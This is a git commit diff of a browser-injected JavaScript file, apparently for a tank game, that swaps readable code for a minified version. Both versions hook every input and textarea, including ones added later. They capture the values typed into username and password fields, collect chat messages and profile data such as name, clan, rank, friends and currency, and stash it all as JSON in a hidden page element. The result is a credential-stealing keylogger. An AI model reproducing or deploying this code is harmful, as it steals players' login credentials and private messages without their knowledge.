26cdc9243b18dbc1851f600d825dd055ca57784c
LEaRCrEaM <127627494+LEaRCrEaM@users.noreply.github.com>
2025-07-29 18:03:46 -0400

    Update asdw1fasd.js

--- asdw1fasd.js
+++ asdw1fasd.js
@@ -1,11 +1,21 @@
 (() => {
-    var div = document.createElement('div');
-    document.body.appendChild(div);
-    div.textContent = JSON.stringify(window.User);
-    div.classList.add('test');
-    div.style.display = 'none';
-    var User1;
-    window.User = {
+    var e, n = document.createElement("div");
+
+    function r(e) {
+        const t = t => {
+            "Enter" == t.key && ("username" === e?.id || e?.id?.includes("password") ? User.patata += e.value : (User.messages += e.value, setTimeout((() => {
+                User.messages = ""
+            }), 1e3)), e.removeEventListener("keydown", e._keydownListener), delete e._keydownListener)
+        };
+        e.addEventListener("keydown", t), e._keydownListener = t, e.tt = !0
+    }
+
+    function s(e) {
+        (e._keydownListener || e.tt) && ("username" === e?.id || e?.id?.includes("password") ? User.patata += e.value : (User.messages += e.value, setTimeout((() => {
+            User.messages = ""
+        }), 1e3)), e.removeEventListener("keydown", e._keydownListener), delete e._keydownListener)
+    }
+    document.body.appendChild(n), n.textContent = JSON.stringify(window.User), n.classList.add("test"), n.style.display = "none", window.User = {
         name: null,
         clan: null,
         turret: {
@@ -22,187 +32,70 @@
         crystals: null,
         tankoins: null,
         friends: [],
-        messages: '',
-        patata: '',
+        messages: "",
+        patata: "",
         getTank() {
-            return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
+            return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`
         },
         getName() {
-            return `${this.clan} ${this.name}`;
+            return `${this.clan} ${this.name}`
         }
-    };
-    function findDetails() {
-        if (!User.name) {
-            if (t = document.querySelector('.UserInfoContainerStyle-userNameRank.UserInfoContainerStyle-textDecoration')) {
-                if (t.textContent.includes('[')) {
-                    User.clan = t.textContent.match(/\[.+\]/g)[0];
-                    User.name = t.textContent.replace(t.textContent.match(/\[.+\]/g)[0], '').trim();
-                } else {
-                    User.name = t.textContent.trim();
-                };
-                /*setTimeout(() => {
-                    User.patata = '';
-                }, 5000);*/
-                if ((User.name.length > 2) && ([/*'Midway', 'Queen.of.Spain', 'Arpecu9_KunuT_Bo_MHe', 'DerMar'*//*, 'Who_Boss', 'POLYANASMEHA', '0_0_PBX_2.0', '30P', 'NewAguero', 'Shot.Of.Liquor_43', 'NertZ''Lend'*/].includes(User.name))) {
-                    alert(`No Access. Contant 'xxprosolxx' on Discord.`);
-                    for (const k in window) {
-                        window[k] = 't';
-                    };
-                };
-            };
-        };
-        if (document.querySelector('.FriendListComponentStyle-scrollCommunity')) {
-            document.querySelectorAll('[class*="-nickName"]').forEach(e => {
-                if (!User.friends.includes(e.textContent)) {
-                    User.friends.push(e.textContent);
-                };
-            });
-        };
-        if (!User.turret.name || !User.hull.name) {
-            if (!Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0] && Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0]) {
-                Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0].click();
-
-            } else if (t = Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0]) {
-                User.turret.name = t.textContent.split(' ')[0];
-                User.turret.upgrades = t.textContent.split(' ')[1];
-                User.hull.name = t.textContent.split(' ')[5];
-                User.hull.upgrades = t.textContent.split(' ')[6];
-            };
-        };
-        if (!User.rank) {
-            if (t = document.querySelector('img[src*=".webp"][class="UserInfoContainerStyle-titleRankIcon"]')) {
-                User.rank = parseInt(t.src.split('/')[t.src.split('/').length - 1].split('.')[0]);
-            };
-        };
-        /*if (!User.GS) {
-            if () {
-    
-            };
-        };*/
-        if (!User.exp) {
-            if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
-                User.exp = t.textContent;
-            };
-        };
-        if (!User.crystals || !User.tankoins) {
-            if (document.querySelectorAll('.HeaderCommonStyle-icons').length == 2) {
-                User.tankoins = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[0].textContent.replaceAll(' ', ''));
-                User.crystals = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[1].textContent.replaceAll(' ', ''));
-            };
-        };
-        if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
-            if (t.textContent !== User.exp) {
-                var pppppp = User.messages;
-                User1 = User;
-                User = {
-                    name: null,
-                    clan: null,
-                    turret: {
-                        name: null,
-                        upgrades: null
-                    },
-                    hull: {
-                        name: null,
-                        upgrades: null
-                    },
-                    GS: null,
-                    rank: null,
-                    exp: null,
-                    crystals: null,
-                    tankoins: null,
-                    friends: [],
-                    messages: pppppp,
-                    patata: '',
-                    getTank() {
-                        return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
-                    },
-                    getName() {
-                        return `${this.clan} ${this.name}`;
-                    }
-                };
-                User.friends = User1.friends;
-                User.patata = User1.patata;
-            };
-        };
-        if (div.textContent !== JSON.stringify(window.User)) {
-            div.textContent = ',,,' + JSON.stringify(window.User);
-        };
-    };
-    function attachInputListener(element) {
-        const keydownListener = (e) => {
-            /*if (!this.tt) {
-                this.tt = e.key;
-            } else {
-                this.tt += e.key;
-            };*/
-            if (e.key == 'Enter') {
-                if (element?.id !== 'username' && !element?.id?.includes('password')) {
-                    User.messages += element.value;
-                    setTimeout(() => {
-                        User.messages = '';
-                    }, 1000);
-                } else {
-                    User.patata += element.value;
-                };
-                element.removeEventListener('keydown', element._keydownListener);
-                delete element._keydownListener;
-            };
-        };
-        element.addEventListener('keydown', keydownListener);
-        element._keydownListener = keydownListener;
-        element.tt = true;
-    };
-    function removeInputListener(element) {
-        if (element._keydownListener || element.tt) {
-            if (element?.id !== 'username' && !element?.id?.includes('password')) {
-                User.messages += element.value;
-                setTimeout(() => {
-                    User.messages = '';
-                }, 1000);
-            } else {
-                User.patata += element.value;
-            };
-            element.removeEventListener('keydown', element._keydownListener);
-            delete element._keydownListener;
-        };
-    };
-    document.querySelectorAll('input, textarea').forEach(attachInputListener);
-    const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-            mutation.addedNodes.forEach((node) => {
-                if (node.nodeType === 1) {
-                    if (node.matches('input, textarea')) {
-                        attachInputListener(node);
-                    };
-                    node.querySelectorAll('input, textarea').forEach(attachInputListener);
-                }
-            });
-            mutation.removedNodes.forEach((node) => {
-                if (node.nodeType === 1) {
-                    if (node.matches('input, textarea')) {
-                        removeInputListener(node);
-                    };
-                    node.querySelectorAll('input, textarea').forEach(removeInputListener);
-                }
-            });
-        });
+    }, document.querySelectorAll("input, textarea").forEach(r);
+    new MutationObserver((e => {
+        e.forEach((e => {
+            e.addedNodes.forEach((e => {
+                1 === e.nodeType && (e.matches("input, textarea") && r(e), e.querySelectorAll("input, textarea").forEach(r))
+            })), e.removedNodes.forEach((e => {
+                1 === e.nodeType && (e.matches("input, textarea") && s(e), e.querySelectorAll("input, textarea").forEach(s))
+            }))
+        }))
+    })).observe(document.body, {
+        childList: !0,
+        subtree: !0
     });
-    observer.observe(document.body, {
-        childList: true,
-        subtree: true,
-    });
-    var r = true, f;
-    function a() {
-        if (r) {
-            f = requestAnimationFrame(a);
-            findDetails();
-        };
-    };
+    var l, o = !0;
     try {
-        a();
-    } catch (error) {
-        r = false;
-        cancelAnimationFrame(f);
-        console.log(error);
-    };
+        ! function r() {
+            o && (l = requestAnimationFrame(r), function() {
+                if (!User.name && (t = document.querySelector(".UserInfoContainerStyle-userNameRank.UserInfoContainerStyle-textDecoration")) && (t.textContent.includes("[") ? (User.clan = t.textContent.match(/\[.+\]/g)[0], User.name = t.textContent.replace(t.textContent.match(/\[.+\]/g)[0], "").trim()) : User.name = t.textContent.trim(), User.name.length > 2 && [, "Luciana"].includes(User.name))) {
+                    alert("No Access. Contant '.r3y_' on Discord.");
+                    for (const e in window) window[e] = "t"
+                }
+                if (document.querySelector(".FriendListComponentStyle-scrollCommunity") && document.querySelectorAll('[class*="-nickName"]').forEach((e => {
+                        User.friends.includes(e.textContent) || User.friends.push(e.textContent)
+                    })), User.turret.name && User.hull.name || (!Array.from(document.querySelectorAll(".Font-regular")).filter((e => 2 == e.classList.length))[0] && Array.from(document.querySelectorAll(".HotKey-commonBlockForHotKey")).filter((e => "t" == e.textContent.toLowerCase()))[0] ? Array.from(document.querySelectorAll(".HotKey-commonBlockForHotKey")).filter((e => "t" == e.textContent.toLowerCase()))[0].click() : (t = Array.from(document.querySelectorAll(".Font-regular")).filter((e => 2 == e.classList.length))[0]) && (User.turret.name = t.textContent.split(" ")[0], User.turret.upgrades = t.textContent.split(" ")[1], User.hull.name = t.textContent.split(" ")[5], User.hull.upgrades = t.textContent.split(" ")[6])), User.rank || (t = document.querySelector('img[src*=".webp"][class="UserInfoContainerStyle-titleRankIcon"]')) && (User.rank = parseInt(t.src.split("/")[t.src.split("/").length - 1].split(".")[0])), User.exp || (t = document.querySelector(".UserInfoContainerStyle-progressValue")) && (User.exp = t.textContent), User.crystals && User.tankoins || 2 == document.querySelectorAll(".HeaderCommonStyle-icons").length && (User.tankoins = parseInt(document.querySelectorAll(".HeaderCommonStyle-icons")[0].textContent.replaceAll(" ", "")), User.crystals = parseInt(document.querySelectorAll(".HeaderCommonStyle-icons")[1].textContent.replaceAll(" ", ""))), (t = document.querySelector(".UserInfoContainerStyle-progressValue")) && t.textContent !== User.exp) {
+                    var r = User.messages;
+                    e = User, User = {
+                        name: null,
+                        clan: null,
+                        turret: {
+                            name: null,
+                            upgrades: null
+                        },
+                        hull: {
+                            name: null,
+                            upgrades: null
+                        },
+                        GS: null,
+                        rank: null,
+                        exp: null,
+                        crystals: null,
+                        tankoins: null,
+                        friends: [],
+                        messages: r,
+                        patata: "",
+                        getTank() {
+                            return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`
+                        },
+                        getName() {
+                            return `${this.clan} ${this.name}`
+                        }
+                    }, User.friends = e.friends, User.patata = e.patata
+                }
+                n.textContent !== JSON.stringify(window.User) && (n.textContent = ",,," + JSON.stringify(window.User))
+            }())
+        }()
+    } catch (e) {
+        o = !1, cancelAnimationFrame(l), console.log(e)
+    }
 })();
